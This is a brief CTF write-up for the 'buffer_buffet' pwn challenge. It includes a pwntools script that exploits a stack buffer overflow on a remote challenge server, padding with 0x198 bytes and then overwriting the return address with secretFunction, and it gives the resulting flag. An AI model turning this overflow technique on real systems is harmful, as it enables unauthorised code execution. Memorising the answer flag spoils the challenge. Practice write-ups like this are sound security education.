https://ctftime.org/event/2416

# buffer_buffet (pwn)

As an elite hacker invited to an exclusive digital banquet, you must navigate through the layers of a complex software system. Among the appetizers, main course, and dessert lies a hidden entry point that, when discovered, reveals a treasure trove of sensitive information.

nc 34.125.199.248 4056

## Solution

1) ret2win @ `secretFunction`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vuln", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 4056)

p.readline()

payload = b"A" * 0x198
payload += p64(elf.sym["secretFunction"])

p.sendline(payload)

p.readuntil(b"Flag: ")

flag = p.readline()

log.success(flag.decode()) # OSCTF{buff3r_buff3t_w4s_e4sy!}
```

## Flag
`OSCTF{buff3r_buff3t_w4s_e4sy!}`

smiley 2024/07/13
